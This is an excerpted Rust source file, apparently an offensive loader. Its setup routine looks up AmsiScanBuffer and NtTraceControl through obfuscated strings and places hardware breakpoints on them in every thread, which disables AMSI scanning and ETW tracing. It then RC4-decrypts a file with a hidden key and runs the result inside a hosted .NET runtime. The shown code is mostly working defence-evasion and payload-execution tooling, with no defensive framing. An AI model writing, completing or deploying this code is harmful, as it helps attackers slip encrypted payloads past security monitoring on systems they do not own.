...
use winapi::um::{
    ...
    winnt::{
        ACCESS_MASK, CONTEXT, CONTEXT_ALL, EXCEPTION_POINTERS, HANDLE, LONG, PVOID,
        THREAD_ALL_ACCESS,
    },
};
...
fn setup() -> Result<*mut c_void, String> {
    ...
    unsafe {
        if (*addr_of!(AMSI_SCAN_BUFFER_PTR)).is_none() {
            let module_name = CString::new(sources::build_string1()).unwrap();
            let mut module_handle = GetModuleHandleA(module_name.as_ptr());
            if module_handle.is_null() {
                module_handle = LoadLibraryA(module_name.as_ptr());
            }
            let function_name = CString::new(sources::build_string2()).unwrap();
            let amsi_scan_buffer = GetProcAddress(module_handle, function_name.as_ptr());

            if !amsi_scan_buffer.is_null() {
                *addr_of_mut!(AMSI_SCAN_BUFFER_PTR) = Some(amsi_scan_buffer as *mut u8);
            }
        }

        if (*addr_of!(NT_TRACE_CONTROL_PTR)).is_none() {
            let ntdll_module_name = CString::new(sources::build_string3()).unwrap();
            let ntdll_module_handle = GetModuleHandleA(ntdll_module_name.as_ptr());
            let ntdll_function_name = CString::new(sources::build_string4()).unwrap();
            let ntdll_function_ptr =
                GetProcAddress(ntdll_module_handle, ntdll_function_name.as_ptr());

            if !ntdll_function_ptr.is_null() {
                *addr_of_mut!(NT_TRACE_CONTROL_PTR) = Some(ntdll_function_ptr as *mut u8);
            }
        }
    }
    ...
    for thread_handle in &thread_handles {
        if unsafe { NtGetContextThread(thread_handle.clone(), &mut thread_ctx) } == 0 {
            unsafe {
                if let Some(amsi_ptr) = *addr_of!(AMSI_SCAN_BUFFER_PTR) {
                    enable_breakpoint(&mut thread_ctx, amsi_ptr, 0);
                }
                if let Some(nt_trace_ptr) = *addr_of!(NT_TRACE_CONTROL_PTR) {
                    enable_breakpoint(&mut thread_ctx, nt_trace_ptr, 1);
                }
                NtSetContextThread(thread_handle.clone(), &mut thread_ctx);
            }
        }
...
fn decrypt_rc4(filename: &str) -> Vec<u8> {
    ...
    let s: Vec<u8> = sources::build_string9();
    let mut rc4 = Rc4::new(GenericArray::<u8, U25>::from_slice(&s));
...
fn main() -> Result<(), String> {
    ...
    match setup() {
        Ok(_) => {
            ...
            let results = clr.run()?;
            println!("{}\n{}", sources::build_string8(), results);
            process::exit(0);
        }
        Err(err_msg) => {
            println!("{}{}", sources::build_string5(), err_msg);
        }
    }
    Ok(())
}
